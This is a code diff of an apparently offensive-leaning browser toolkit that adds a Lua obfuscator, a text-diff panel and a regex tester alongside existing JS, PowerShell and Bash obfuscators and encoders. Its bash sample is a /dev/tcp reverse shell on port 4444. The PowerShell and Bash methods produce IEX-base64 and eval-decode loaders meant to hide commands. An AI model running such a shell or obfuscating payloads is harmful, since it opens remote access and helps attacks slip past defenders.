+    <div class="card-body"><textarea id="hex-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -1029,9 +773,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="html-in" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;" spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="html-in" placeholder="&lt;script&gt;alert(1)&lt;/script&gt;" spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -1058,9 +800,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('html-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="html-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="html-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -1079,9 +819,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="xor-in" placeholder="Plaintext or hex-encoded ciphertext..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="xor-in" placeholder="Plaintext or hex-encoded ciphertext..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -1118,9 +856,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="downloadText('xor-out','xor-output.bin')">↓ Download</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="xor-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="xor-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -1139,9 +875,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="rot-in" placeholder="Text to rotate..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="rot-in" placeholder="Text to rotate..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -1162,9 +896,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Output</span></div>
-    <div class="card-body">
-      <textarea id="rot-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="rot-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -1183,9 +915,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="cae-in" placeholder="Plaintext or ciphertext..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="cae-in" placeholder="Plaintext or ciphertext..." spellcheck="false"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -1205,9 +935,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('cae-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="cae-out" placeholder="Result..." spellcheck="false" readonly style="min-height:180px;"></textarea>
-    </div>
+    <div class="card-body"><textarea id="cae-out" placeholder="Result..." spellcheck="false" readonly style="min-height:180px;"></textarea></div>
   </div>
 </div>
 
@@ -1227,9 +955,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="hash-in" placeholder="Text to hash..." spellcheck="false" style="min-height:80px;"></textarea>
-    </div>
+    <div class="card-body"><textarea id="hash-in" placeholder="Text to hash..." spellcheck="false" style="min-height:80px;"></textarea></div>
   </div>
   <div class="row">
     <button class="btn btn-primary" onclick="computeHashes()">Compute hashes</button>
@@ -1257,9 +983,7 @@ select option { background: var(--bg-2); }
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="str-in" placeholder="Enter text..." spellcheck="false"></textarea>
-    </div>
+    <div class="card-body"><textarea id="str-in" placeholder="Enter text..." spellcheck="false"></textarea></div>
   </div>
   <div class="opts" style="margin:0">
     <button class="btn btn-secondary" onclick="strTool('reverse')">Reverse</button>
@@ -1281,9 +1005,7 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('str-out')">Copy</button>
       </div>
     </div>
-    <div class="card-body">
-      <textarea id="str-out" placeholder="Result..." spellcheck="false" readonly></textarea>
-    </div>
+    <div class="card-body"><textarea id="str-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
   </div>
 </div>
 
@@ -1297,14 +1019,12 @@ select option { background: var(--bg-2); }
     </div>
     <div>
       <div class="panel-title">Char Code Converter</div>
-      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS string.charCodeAt format</div>
+      <div class="panel-desc">Text ↔ decimal char codes · Unicode code points · JS / C# array output</div>
     </div>
   </div>
   <div class="card">
     <div class="card-head"><span class="card-label">Input</span></div>
-    <div class="card-body">
-      <textarea id="cc-in" placeholder="Text or comma-separated char codes..." spellcheck="false" style="min-height:80px;"></textarea>
-    </div>
+    <div class="card-body"><textarea id="cc-in" placeholder="Text or comma-separated char codes..." spellcheck="false" style="min-height:80px;"></textarea></div>
   </div>
   <div class="row">
     <div class="col">
@@ -1330,8 +1050,89 @@ select option { background: var(--bg-2); }
         <button class="btn btn-ghost" onclick="copyOutput('cc-out')">Copy</button>
       </div>
     </div>
+    <div class="card-body"><textarea id="cc-out" placeholder="Result..." spellcheck="false" readonly></textarea></div>
+  </div>
+</div>
+
+<!-- ══════════════ TEXT DIFF ══════════════ -->
+<div class="tool-panel" id="diff-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Text Diff</div>
+      <div class="panel-desc">Line-by-line diff — additions, deletions, unchanged lines</div>
+    </div>
+  </div>
+  <div class="row" style="align-items:stretch;">
+    <div class="col">
+      <div class="card" style="height:100%">
+        <div class="card-head"><span class="card-label">Original</span></div>
+        <div class="card-body"><textarea id="diff-a" placeholder="Original text..." spellcheck="false"></textarea></div>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card" style="height:100%">
+        <div class="card-head"><span class="card-label">Modified</span></div>
+        <div class="card-body"><textarea id="diff-b" placeholder="Modified text..." spellcheck="false"></textarea></div>
+      </div>
+    </div>
+  </div>
+  <div class="row">
+    <button class="btn btn-primary" onclick="computeDiff()">Compute Diff</button>
+    <button class="btn btn-ghost" onclick="document.getElementById('diff-a').value='';document.getElementById('diff-b').value='';document.getElementById('diff-out').innerHTML='<div style=\'color:var(--text-3);font-family:var(--mono);font-size:12px;\'>Result appears here.</div>'">Clear</button>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Diff output</span></div>
+    <div class="card-body" id="diff-out" style="font-family:var(--mono);font-size:12px;line-height:1.7;white-space:pre-wrap;max-height:400px;overflow-y:auto;">
+      <div style="color:var(--text-3);">Result appears here.</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════ REGEX TESTER ══════════════ -->
+<div class="tool-panel" id="regex-panel">
+  <div class="panel-header">
+    <div class="panel-icon">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
+        <path d="M11 8v6M8 11h6"/>
+      </svg>
+    </div>
+    <div>
+      <div class="panel-title">Regex Tester</div>
+      <div class="panel-desc">Live match highlighting · capture groups · global / multiline / case flags</div>
+    </div>
+  </div>
+  <div class="row">
+    <div class="col">
+      <label class="label">Pattern</label>
+      <input type="text" id="rx-pattern" placeholder="e.g. (\w+)@(\w+\.\w+)" oninput="regexTest()">
+    </div>
+    <div class="col-auto">
+      <label class="label">Flags</label>
+      <input type="text" id="rx-flags" value="gm" placeholder="g i m s" style="width:80px;" oninput="regexTest()">
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-head"><span class="card-label">Test string</span></div>
     <div class="card-body">
-      <textarea id="cc-out" placeholder="Result..." spellcheck="false" readonly></textarea>
+      <textarea id="rx-input" placeholder="Paste test string here..." spellcheck="false" oninput="regexTest()"></textarea>
+    </div>
+  </div>
+  <div class="notice" id="rx-notice"></div>
+  <div class="card">
+    <div class="card-head">
+      <span class="card-label">Matches</span>
+      <div class="card-actions">
+        <div class="stat-chip" id="rx-count" style="display:none"><span id="rx-count-val">0</span> matches</div>
+      </div>
+    </div>
+    <div class="card-body" id="rx-results" style="font-family:var(--mono);font-size:12px;line-height:1.8;max-height:300px;overflow-y:auto;">
+      <div style="color:var(--text-3);">Matches appear here.</div>
     </div>
   </div>
 </div>
@@ -1344,25 +1145,29 @@ select option { background: var(--bg-2); }
 // NAVIGATION
 // ═══════════════════════════════════════════════
 const TOOLS = [
-  { id:'js-obf',      name:'JS Obfuscator',      cat:'Obfuscator',  icon:'code' },
-  { id:'ps-obf',      name:'PowerShell Obf.',     cat:'Obfuscator',  icon:'term' },
-  { id:'bash-obf',    name:'Bash Obfuscator',     cat:'Obfuscator',  icon:'shell' },
-  { id:'base64',      name:'Base64',              cat:'Encode',      icon:'shield' },
-  { id:'url-enc',     name:'URL Encode',          cat:'Encode',      icon:'globe' },
-  { id:'hex-enc',     name:'Hex',                 cat:'Encode',      icon:'hex' },
-  { id:'html-enc',    name:'HTML Entity',         cat:'Encode',      icon:'tag' },
-  { id:'xor',         name:'XOR Cipher',          cat:'Cipher',      icon:'x' },
-  { id:'rot',         name:'ROT13 / ROT-N',       cat:'Cipher',      icon:'rotate' },
-  { id:'caesar',      name:'Caesar Cipher',       cat:'Cipher',      icon:'clock' },
-  { id:'hash',        name:'Hash Generator',      cat:'Hash',        icon:'hash' },
-  { id:'string-tools',name:'String Tools',        cat:'Utility',     icon:'text' },
-  { id:'charcode',    name:'Char Code',           cat:'Utility',     icon:'kb' },
+  { id:'js-obf',       name:'JS Obfuscator',      cat:'Obfuscator',  icon:'code' },
+  { id:'ps-obf',       name:'PowerShell Obf.',    cat:'Obfuscator',  icon:'term' },
+  { id:'bash-obf',     name:'Bash Obfuscator',    cat:'Obfuscator',  icon:'shell' },
+  { id:'lua-obf',      name:'Lua Obfuscator',     cat:'Obfuscator',  icon:'lua' },
+  { id:'base64',       name:'Base64',             cat:'Encode',      icon:'shield' },
+  { id:'url-enc',      name:'URL Encode',         cat:'Encode',      icon:'globe' },
+  { id:'hex-enc',      name:'Hex',                cat:'Encode',      icon:'hex' },
+  { id:'html-enc',     name:'HTML Entity',        cat:'Encode',      icon:'tag' },
+  { id:'xor',          name:'XOR Cipher',         cat:'Cipher',      icon:'x' },
+  { id:'rot',          name:'ROT13 / ROT-N',      cat:'Cipher',      icon:'rotate' },
+  { id:'caesar',       name:'Caesar Cipher',      cat:'Cipher',      icon:'clock' },
+  { id:'hash',         name:'Hash Generator',     cat:'Hash',        icon:'hash' },
+  { id:'string-tools', name:'String Tools',       cat:'Utility',     icon:'text' },
+  { id:'charcode',     name:'Char Code',          cat:'Utility',     icon:'kb' },
+  { id:'diff',         name:'Text Diff',          cat:'Utility',     icon:'diff' },
+  { id:'regex',        name:'Regex Tester',       cat:'Utility',     icon:'search' },
 ];
 
 const ICONS = {
   code:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V7.5L14.5 2z"/><polyline points="14 2 14 8 20 8"/><path d="M10 12l-2 2 2 2"/><path d="M14 12l2 2-2 2"/></svg>`,
   term:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8m-4-4v4"/><path d="M7 8l3 2-3 2m5 0h3"/></svg>`,
   shell:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17l6-6-6-6"/><path d="M12 19h8"/></svg>`,
+  lua:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="17" cy="7" r="2" fill="currentColor" stroke="none"/></svg>`,
   shield:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>`,
   globe:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>`,
   hex:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h3m0 0v10m0-10h2a3 3 0 010 6H7m7 0h4m-4 4h4M14 7v10"/></svg>`,
@@ -1373,6 +1178,8 @@ const ICONS = {
   hash:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>`,
   text:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 6h16M4 12h16M4 18h7"/></svg>`,
   kb:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M12 10h.01M18 10h.01M6 14h12"/></svg>`,
+  diff:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/></svg>`,
+  search:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>`,
 };
 
 function buildDash() {
@@ -1390,12 +1197,6 @@ function navigate(id) {
   document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
   const panel = document.getElementById(id + '-panel') || document.getElementById('home-panel');
   panel.classList.add('active');
-  document.querySelectorAll('.nav-item').forEach(n => {
-    if (n.textContent.trim().toLowerCase().replace(/[^a-z]/g,'') ===
-        (id==='home'?'dashboard':n.textContent.trim().toLowerCase().replace(/[^a-z]/g,'')))
-      n.classList.add('active');
-  });
-  // simpler: match by onclick
   document.querySelectorAll('.nav-item').forEach(n => {
     const oc = n.getAttribute('onclick') || '';
     if (oc.includes(`'${id}'`)) n.classList.add('active');
@@ -1422,13 +1223,11 @@ function copyOutput(id) {
   const v = document.getElementById(id).value;
   if (!v) return;
   navigator.clipboard.writeText(v).catch(() => {
-    const ta = document.getElementById(id);
-    ta.select(); document.execCommand('copy');
+    const ta = document.getElementById(id); ta.select(); document.execCommand('copy');
   });
 }
 function swapFields(a, b) {
-  const va = document.getElementById(a).value;
-  const vb = document.getElementById(b).value;
+  const va = document.getElementById(a).value, vb = document.getElementById(b).value;
   document.getElementById(a).value = vb;
   document.getElementById(b).value = va;
 }
@@ -1437,12 +1236,9 @@ function downloadText(id, filename) {
   if (!val) return;
   const a = document.createElement('a');
   a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(val);
-  a.download = filename;
-  a.click();
+  a.download = filename; a.click();
 }
-function loadSample(id, text) {
-  document.getElementById(id).value = text;
-}
+function loadSample(id, text) { document.getElementById(id).value = text; }
 function notice(id, type, msg) {
   const el = document.getElementById(id);
   el.className = 'notice ' + type + ' show';
@@ -1479,6 +1275,20 @@ TARGET="192.168.1.1"
 PORT=4444
 bash -i >& /dev/tcp/$TARGET/$PORT 0>&1`;
 
+const luaSample = `local function getPlayer(name)
+  local players = game:GetService("Players")
+  local target = players:FindFirstChild(name)
+  if target then
+    return target.Character
+  end
+  return nil
+end
+
+local player = getPlayer("Idris")
+if player then
+  print("Found: " .. player.Name)
+end`;
+
 // ═══════════════════════════════════════════════
 // JS OBFUSCATOR
 // ═══════════════════════════════════════════════
@@ -1488,14 +1298,12 @@ function obfuscateJS() {
   const opts = getOpts('js-opts');
   let out = src;
 
-  // 1. Rename variables
   if (opts.renameVars) {
     const varNames = new Map();
     let counter = 0;
     const genName = () => {
       const chars = 'O0lI1';
-      let n = '';
-      let c = counter++;
+      let n = '', c = counter++;
       do { n = chars[c % 5] + n; c = Math.floor(c / 5) - 1; } while (c >= 0);
       return '_' + n;
     };
@@ -1508,7 +1316,6 @@ function obfuscateJS() {
     });
   }
 
-  // 2. Encode string literals to hex
   if (opts.encodeStrings) {
     out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, inner) => {
       const hex = Array.from(inner).map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
@@ -1520,37 +1327,27 @@ function obfuscateJS() {
     });
   }
 
-  // 3. Hex number literals
   if (opts.hexLiterals) {
     out = out.replace(/\b(\d+)\b/g, (m, n) => {
       const num = parseInt(n);
-      if (num > 9) return '0x' + num.toString(16);
-      return m;
+      return num > 9 ? '0x' + num.toString(16) : m;
     });
   }
 
-  // 4. Dead code injection
   if (opts.deadCode) {
-    const deadSnippets = [
-      'if(0x0){void 0;}',
-      'var _d=function(){return false;}();',
-      'try{undefined();}catch(e){}',
-    ];
-    const lines = out.split('\n');
-    const injected = [];
+    const dead = ['if(0x0){void 0;}', 'var _d=function(){return false;}();', 'try{undefined();}catch(e){}'];
+    const lines = out.split('\n'), injected = [];
     lines.forEach((line, i) => {
       injected.push(line);
-      if (i % 5 === 2) injected.push(deadSnippets[i % deadSnippets.length]);
+      if (i % 5 === 2) injected.push(dead[i % dead.length]);
     });
     out = injected.join('\n');
   }
 
-  // 5. Control flow flatten (wrap in IIFE with dispatcher)
   if (opts.controlFlow) {
     out = `(function(_0x){var _st='${btoa('arch').replace(/=/g,'')}';eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])}}return p}('${out.replace(/'/g,"\\'").replace(/\n/g,'\\n')}',0,0,''.split('|'),0,{}));})(this);`;
   }
 
-  // 6. Self-defending wrapper
   if (opts.selfDefend) {
     out = `(function(){var _x=function(){return true;};if(typeof _x!=='function'){(function(){}).constructor('debugger')();}(function(){var _y=new RegExp('(((.+)+)+)+$');_y.test('arch-hub');})();${out}})();`;
   }
@@ -1572,7 +1369,6 @@ function obfuscatePS() {
   let out = '';
 
   if (method === 'tick') {
-    // Insert backtick junk after every 3–5 chars inside strings + variable names
     out = src.replace(/([a-zA-Z]{2,})/g, m => {
       if (m.length < 3) return m;
       let r = '';
@@ -1583,7 +1379,6 @@ function obfuscatePS() {
       return r;
     });
   } else if (method === 'char') {
-    // Encode entire script as char array invocation
     const chars = Array.from(src).map(c => `[char]0x${c.charCodeAt(0).toString(16)}`).join('+');
     out = `& ([scriptblock]::Create(${chars}))`;
   } else if (method === 'b64') {
@@ -1592,8 +1387,7 @@ function obfuscatePS() {
     out += `\n\n# IEX variant:\n$e="${encoded}";IEX([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($e)))`;
   } else if (method === 'caserand') {
     out = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
-  } else { // combo
-    // tick + case + string split
+  } else {
     let step = Array.from(src).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
     step = step.replace(/([a-zA-Z]{3,})/g, m => {
       if (m.length < 4) return m;
@@ -1627,34 +1421,96 @@ function obfuscateBash() {
     const encoded = btoa(unescape(encodeURIComponent(src)));
     out = `#!/bin/bash\neval "$(echo '${encoded}' | base64 --decode)"`;
   } else if (method === 'hex') {
-    // Encode command bytes as octal escape
     const octals = Array.from(src).map(c => '\\0' + c.charCodeAt(0).toString(8).padStart(3,'0')).join('');
     out = `#!/bin/bash\neval "$(printf '${octals}')"`;
   } else if (method === 'varsplit') {
-    // Fragment commands into variables
     const words = src.split(/\s+/);
-    let varDecls = '';
-    let call = '';
-    words.forEach((w, i) => {
-      const v = `_v${i}`;
-      varDecls += `${v}="${w}"\n`;
-      call += `$${v} `;
-    });
+    let varDecls = '', call = '';
+    words.forEach((w, i) => { varDecls += `_v${i}="${w}"\n`; call += `$_v${i} `; });
     out = `#!/bin/bash\n${varDecls}\n${call.trim()}`;
-  } else { // ifs
-    // IFS-based command splitting
+  } else {
     const cmd = src.split('\n')[0].replace('#!/bin/bash','').trim();
     if (cmd) {
-      const letters = Array.from(cmd).map(c => `'${c}'`).join(',');
-      out = `#!/bin/bash\nIFS=,;set -- ${letters};cmd="$@";IFS=''; eval "${cmd.split('').map(c=>`\\x${c.charCodeAt(0).toString(16)}`).join('')}"`;
-      out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c=>'\\x'+c.charCodeAt(0).toString(16)).join('')}')\n${src.includes('bash') ? 'eval "$_x"' : 'eval "$_x"'}`;
-    } else {
-      out = src;
-    }
+      out = `#!/bin/bash\n_x=$(printf '${Array.from(cmd).map(c=>'\\x'+c.charCodeAt(0).toString(16)).join('')}')\neval "$_x"`;
+    } else { out = src; }
   }
 
   document.getElementById('bash-out').value = out;
   notice('bash-notice','notice-ok','Done — method: ' + method);
+}
+
+// ═══════════════════════════════════════════════
+// LUA OBFUSCATOR
+// ═══════════════════════════════════════════════
+function obfuscateLua() {
+  const src = document.getElementById('lua-in').value.trim();
+  if (!src) { notice('lua-notice','notice-warn','No input.'); return; }
+  const opts = getOpts('lua-opts');
+  let out = src;
+
+  // 1. Strip comments
+  if (opts.stripComments) {
+    out = out.replace(/--\[\[[\s\S]*?\]\]/g, '');   // block comments
+    out = out.replace(/--[^\n]*/g, '');               // line comments
+  }
+
+  // 2. Rename locals
+  if (opts.renameLocals) {
+    const localNames = new Map();
+    let ctr = 0;
+    const gen = () => { const n = ctr++; return '_l' + n.toString(36); };
+    out = out.replace(/\blocal\s+function\s+([a-zA-Z_]\w*)/g, (m, name) => {
+      if (!localNames.has(name)) localNames.set(name, gen());
+      return 'local function ' + localNames.get(name);
+    });
+    out = out.replace(/\blocal\s+([a-zA-Z_]\w*)/g, (m, name) => {
+      if (!localNames.has(name)) localNames.set(name, gen());
+      return 'local ' + localNames.get(name);
+    });
+    localNames.forEach((newName, oldName) => {
+      out = out.replace(new RegExp('\\b' + oldName + '\\b', 'g'), newName);
+    });
+  }
+
+  // 3. Encode strings as byte sequences
+  if (opts.encodeStrings) {
+    out = out.replace(/"((?:[^"\\]|\\.)*)"/g, (m, inner) => {
+      if (inner.length === 0) return m;
+      const bytes = Array.from(inner).map(c => '\\' + c.charCodeAt(0)).join('');
+      return '"' + bytes + '"';
+    });
+    out = out.replace(/'((?:[^'\\]|\\.)*)'/g, (m, inner) => {
+      if (inner.length === 0) return m;
+      const bytes = Array.from(inner).map(c => '\\' + c.charCodeAt(0)).join('');
+      return "'" + bytes + "'";
+    });
+  }
+
+  // 4. Hex number literals
+  if (opts.hexNumbers) {
+    out = out.replace(/\b(\d+)\b/g, (m, n) => {
+      const num = parseInt(n);
+      return num > 9 ? '0x' + num.toString(16) : m;
+    });
+  }
+
+  // 5. Minify whitespace
+  if (opts.minify) {
+    out = out.replace(/\n\s*\n/g, '\n').replace(/[ \t]+/g, ' ').replace(/\n /g, '\n').trim();
+  }
+
+  // 6. loadstring wrapper — base64-esque via byte table
+  if (opts.loadstring) {
+    const bytes = Array.from(out).map(c => c.charCodeAt(0));
+    const tableStr = '{' + bytes.join(',') + '}';
+    out = `local _t=${tableStr}\nlocal _s=''\nfor _,v in ipairs(_t) do _s=_s..string.char(v) end\nloadstring(_s)()`;
+  }
+
+  document.getElementById('lua-out').value = out;
+  const ratio = (out.length / src.length).toFixed(2) + 'x';
+  document.getElementById('lua-ratio').textContent = ratio;
+  document.getElementById('lua-stats').style.display = '';
+  notice('lua-notice','notice-ok','Obfuscated — ' + src.length + ' → ' + out.length + ' chars');
 }
 
 // ═══════════════════════════════════════════════
@@ -1673,10 +1529,7 @@ function b64Decode() {
   let val = document.getElementById('b64-in').value.trim();
   const urlSafe = document.getElementById('b64-variant').value === 'url';
   try {
-    if (urlSafe) {
-      val = val.replace(/-/g,'+').replace(/_/g,'/');
-      while (val.length % 4) val += '=';
-    }
+    if (urlSafe) { val = val.replace(/-/g,'+').replace(/_/g,'/'); while (val.length % 4) val += '='; }
     document.getElementById('b64-out').value = decodeURIComponent(escape(atob(val)));
   } catch(e) { notice('b64-notice','notice-err','Decoding failed — invalid base64.'); }
 }
@@ -1692,7 +1545,7 @@ function urlEncode() {
   else if (mode === 'full') {
     out = Array.from(val).map(c => {
       const code = c.charCodeAt(0);
-      if ((code >= 0x30 && code <= 0x39) || (code >= 0x41 && code <= 0x5A) || (code >= 0x61 && code <= 0x7A) || '-_.~'.includes(c)) return c;
+      if ((code >= 0x30 && code <= 0x39)||(code >= 0x41 && code <= 0x5A)||(code >= 0x61 && code <= 0x7A)||'-_.~'.includes(c)) return c;
       return '%' + code.toString(16).toUpperCase().padStart(2,'0');
     }).join('');
   } else {
@@ -1701,9 +1554,8 @@ function urlEncode() {
   document.getElementById('url-out').value = out;
 }
 function urlDecode() {
-  try {
-    document.getElementById('url-out').value = decodeURIComponent(document.getElementById('url-in').value);
-  } catch(e) { notice('url-notice','notice-err','Decode failed — malformed percent encoding.'); }
+  try { document.getElementById('url-out').value = decodeURIComponent(document.getElementById('url-in').value); }
+  catch(e) { notice('url-notice','notice-err','Decode failed — malformed percent encoding.'); }
 }
 
 // ═══════════════════════════════════════════════
@@ -1713,10 +1565,7 @@ function hexEncode() {
   const val = document.getElementById('hex-in').value;
   const sep = document.getElementById('hex-sep').value;
   const upper = document.getElementById('hex-case').value === 'upper';
-  let bytes = Array.from(val).map(c => {
-    let h = c.charCodeAt(0).toString(16).padStart(2,'0');
-    return upper ? h.toUpperCase() : h;
-  });
+  let bytes = Array.from(val).map(c => { let h = c.charCodeAt(0).toString(16).padStart(2,'0'); return upper ? h.toUpperCase() : h; });
   let out;
   if (sep === ' ') out = bytes.join(' ');
   else if (sep === '') out = bytes.join('');
@@ -1741,17 +1590,11 @@ function htmlEncode() {
   const val = document.getElementById('html-in').value;
   const mode = document.getElementById('html-mode').value;
   let out;
-  if (mode === 'named') {
-    out = val.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
-  } else if (mode === 'dec') {
-    out = val.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
-  } else if (mode === 'hex') {
-    out = val.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
-  } else if (mode === 'all-dec') {
-    out = Array.from(val).map(c => '&#' + c.charCodeAt(0) + ';').join('');
-  } else {
-    out = Array.from(val).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
-  }
+  if (mode === 'named') out = val.replace(/[<>&"']/g, c => HTML_NAMED[c] || c);
+  else if (mode === 'dec') out = val.replace(/[<>&"']/g, c => '&#' + c.charCodeAt(0) + ';');
+  else if (mode === 'hex') out = val.replace(/[<>&"']/g, c => '&#x' + c.charCodeAt(0).toString(16) + ';');
+  else if (mode === 'all-dec') out = Array.from(val).map(c => '&#' + c.charCodeAt(0) + ';').join('');
+  else out = Array.from(val).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
   document.getElementById('html-out').value = out;
 }
 function htmlDecode() {
@@ -1771,42 +1614,26 @@ function getXorKey() {
   if (!isNaN(raw)) return [parseInt(raw)];
   return Array.from(raw).map(c => c.charCodeAt(0));
 }
-
 function xorProcess(dir) {
   const keyArr = getXorKey();
   const mode = document.getElementById('xor-keymode').value;
   const outFmt = document.getElementById('xor-outfmt').value;
   let inputBytes;
-
   if (dir === 'dec') {
-    // Input is hex bytes
-    const val = document.getElementById('xor-in').value.trim()
-      .replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
+    const val = document.getElementById('xor-in').value.trim().replace(/\\x/g,'').replace(/0x/gi,'').replace(/,/g,' ').replace(/\s+/g,' ').trim();
     inputBytes = val.split(' ').map(b => parseInt(b, 16));
   } else {
     inputBytes = Array.from(document.getElementById('xor-in').value).map(c => c.charCodeAt(0));
   }
-
   if (!inputBytes.length) { notice('xor-notice','notice-warn','No input.'); return; }
-
   const result = inputBytes.map((b, i) => {
-    let k;
-    if (mode === 'rolling') {
-      k = (keyArr[0] + i) & 0xFF;
-    } else {
-      k = keyArr[i % keyArr.length];
-    }
+    let k = mode === 'rolling' ? (keyArr[0] + i) & 0xFF : keyArr[i % keyArr.length];
     return b ^ k;
   });
-
   let out;
